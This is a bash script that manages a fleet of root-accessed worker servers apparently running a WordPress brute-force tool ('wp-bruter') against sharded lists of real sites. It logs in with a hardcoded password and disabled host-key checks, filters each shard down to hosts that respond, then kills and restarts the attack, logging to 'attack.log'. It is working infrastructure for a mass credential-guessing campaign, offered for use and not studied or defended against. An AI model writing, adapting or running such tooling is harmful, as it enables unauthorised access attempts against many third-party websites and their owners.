#!/bin/bash
# Rebuild every shard from the live sites only and restart the run.
#
# A swept shard is mostly dead hosts: pre-flight burns 3s on each and the
# workers barely reach targets that answer. A site counts as live if progress
# recorded anything other than network_error for it. Requires progress.txt
# from a completed sweep.
#
# The shard index is read from the running run.sh, so it keeps working after
# the fleet order changes.
#
#   ./farm.sh              # filter + restart
#   ./farm.sh --dry-run    # only report counts
set -u

HERE=$(cd "$(dirname "$0")" && pwd)
FLEET_FILE="${FLEET_FILE:-$HERE/fleet.txt}"
WORKER_PASS="${WORKER_PASS:-fahrel}"
MIN_LIVE="${MIN_LIVE:-200}"
DRY=0
[ "${1:-}" = "--dry-run" ] && DRY=1

SSH_OPTS=(-o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=15 -o ServerAliveInterval=5 -o IPQoS=throughput -o NumberOfPasswordPrompts=1 -o ControlMaster=auto -o ControlPath="/tmp/wpbruter-%r@%h:%p" -o ControlPersist=120)
ssh_cmd() {
    local host="$1" try
    for try in 1 2 3; do
        sshpass -p "$WORKER_PASS" ssh "${SSH_OPTS[@]}" "root@$host" "${@:2}" && return 0
        sleep 2
    done
    return 1
}

for WORKER in $(grep -Ev '^[[:space:]]*(#|$)' "$FLEET_FILE"); do
    printf '[%s] ' "$WORKER"
    out=$(ssh_cmd "$WORKER" "
        cd /opt/wp-bruter || exit 1
        IDX=\$(cat shard.idx 2>/dev/null || pgrep -af 'run[.]sh' | sed -n 's#.*run[.]sh \\([0-9]*\\).*#\\1#p' | head -1)
        [ -n "\$IDX" ] || IDX=\$(ls /root/wordpress.s* 2>/dev/null | sed -n 's#.*wordpress[.]s##p' | head -1)
        IDX=\${IDX:-0}
        [ -s progress.txt ] && [ -f /root/wordpress.s\$IDX ] || { echo \"no progress for shard \$IDX — deploy first\"; exit 0; }
        total=\$(wc -l < /root/wordpress.s\$IDX)
        awk -F'\t' '\$2 != \"network_error\" { print \$1 }' progress.txt \
            | awk '{ h = \$0; sub(/^https?:\/\//, \"\", h); sub(/\/.*/, \"\", h); h = tolower(h); if (!seen[h]) { seen[h] = 1; print \$0 } }' > /tmp/live.url
        n=\$(wc -l < /tmp/live.url)
        echo \"shard \$IDX live \$n/\$total\"
        if [ \"\$n\" -lt $MIN_LIVE ]; then echo \"  keep full shard\"; exit 0; fi
        [ $DRY -eq 1 ] && exit 0
        cp -f /root/wordpress.s\$IDX /root/wordpress.full.s\$IDX
        cp -f /tmp/live.url /root/wordpress.s\$IDX
        rm -f progress.txt
        pkill -9 -x wp-bruter 2>/dev/null
        pkill -9 -f 'run[.]sh' 2>/dev/null
        sleep 2
        PHASES=\"\${PHASES:-150 500 0}\" nohup ./run.sh \$IDX >> attack.log 2>&1 &
        sleep 3
        pgrep -x wp-bruter >/dev/null && echo '  running' || echo '  NOT RUNNING'
    " 2>/dev/null) || { echo "ssh failed"; continue; }
    echo "$out"
done
